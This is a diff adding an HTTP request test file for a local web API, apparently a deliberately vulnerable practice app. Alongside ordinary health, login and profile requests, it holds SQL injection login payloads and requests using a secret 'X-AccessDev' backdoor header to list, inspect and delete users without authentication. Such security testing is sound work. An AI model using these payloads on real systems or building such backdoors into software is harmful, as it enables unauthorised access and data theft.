@@ -1,0 +1,126 @@
+### Health Check
+GET http://localhost:3000/health
+
+###
+
+### Root endpoint
+GET http://localhost:3000/
+
+###
+
+### Test 404
+GET http://localhost:3000/nonexistent
+
+###
+
+# =====================================================
+# AUTHENTICATION ENDPOINTS
+# =====================================================
+
+### Register new user
+POST http://localhost:3000/api/auth/register
+Content-Type: application/json
+
+{
+  "username": "testuser",
+  "email": "test@example.com",
+  "password": "test123"
+}
+
+###
+
+### Login with valid credentials
+POST http://localhost:3000/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "admin"
+}
+
+###
+
+### Login with SQL Injection - Basic (bypass password)
+POST http://localhost:3000/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "' OR '1'='1"
+}
+
+###
+
+### Login with SQL Injection - UNION attack
+POST http://localhost:3000/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin' UNION SELECT id, username, email, password, role, is_active, created_at, updated_at, last_login, login_attempts FROM users WHERE '1'='1",
+  "password": "anything"
+}
+
+###
+
+### Login with SQL Injection - Comment bypass
+POST http://localhost:3000/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'-- ",
+  "password": "anything"
+}
+
+###
+
+### Login with SQL Injection - Always true
+POST http://localhost:3000/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "' OR 1=1-- ",
+  "password": "anything"
+}
+
+###
+
+### Get user profile (requires token from login)
+# Replace YOUR_TOKEN_HERE with actual token from login response
+GET http://localhost:3000/api/auth/profile
+Authorization: Bearer YOUR_TOKEN_HERE
+
+###
+
+# =====================================================
+# ADMIN ENDPOINTS (Requires Admin Role)
+# =====================================================
+
+### Get all users (requires admin token)
+GET http://localhost:3000/api/admin/users
+Authorization: Bearer YOUR_TOKEN_HERE
+
+###
+
+### Get all users with BACKDOOR (NO authentication needed!)
+GET http://localhost:3000/api/admin/users
+X-AccessDev: Testing-Mode
+
+###
+
+### Get audit logs with BACKDOOR
+GET http://localhost:3000/api/admin/audit-logs?limit=20
+X-AccessDev: Testing-Mode
+
+###
+
+### Get database stats with BACKDOOR
+GET http://localhost:3000/api/admin/stats
+X-AccessDev: Testing-Mode
+
+###
+
+### Delete user with BACKDOOR (DANGEROUS!)
+DELETE http://localhost:3000/api/admin/users/6
+X-AccessDev: Testing-Mode
+
+###
